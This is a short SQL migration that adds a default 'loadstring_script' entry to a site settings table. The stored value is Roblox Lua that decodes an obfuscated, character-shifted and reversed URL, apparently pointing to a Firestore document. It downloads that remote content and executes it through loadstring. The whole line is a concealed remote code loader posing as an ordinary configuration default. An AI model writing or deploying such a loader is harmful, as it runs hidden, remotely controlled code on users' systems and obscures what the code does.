-- Add loadstring_script setting if not exists
INSERT INTO public.site_settings (key, value, description)
VALUES ('loadstring_script', 'loadstring(game:GetService''HttpService'':JSONDecode(game:HttpGet(("7h^vs\127uRYIsl8W:<~N8{6z{wpyjz6h{hk6jpsi|w69}4zuh\127lyhoz6z{jhmp{yh6z{ult|jvk60{s|hmlk/6zlzhih{hk6zuh\127l{zhw6z{jlqvyw68}6tvj5zpwhlsnvvn5lyv{zlypm66Azw{{o"):gsub(''.'',function(c)return string.char(c:byte()+1)end):reverse():gsub(''.'',function(c)return string.char(c:byte()-8)end))).fields.content.stringValue)()', 'Default loadstring script untuk users')
ON CONFLICT (key) DO NOTHING;